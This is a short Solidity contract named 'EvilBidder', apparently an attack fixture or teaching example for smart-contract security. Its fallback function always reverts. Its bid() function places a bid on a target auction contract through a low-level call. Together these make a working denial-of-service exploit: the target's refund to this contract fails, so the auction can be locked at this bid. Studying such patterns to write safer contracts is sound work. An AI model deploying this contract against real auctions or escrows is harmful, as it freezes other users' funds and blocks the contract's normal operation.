pragma solidity ^0.4.11;
contract EvilBidder {
  function() payable {
    revert();
  }

  function bid(address _to) public payable {
    if(!_to.call.value(msg.value)(bytes4(sha3("bid()")))) {
      throw;
    }
  }
}


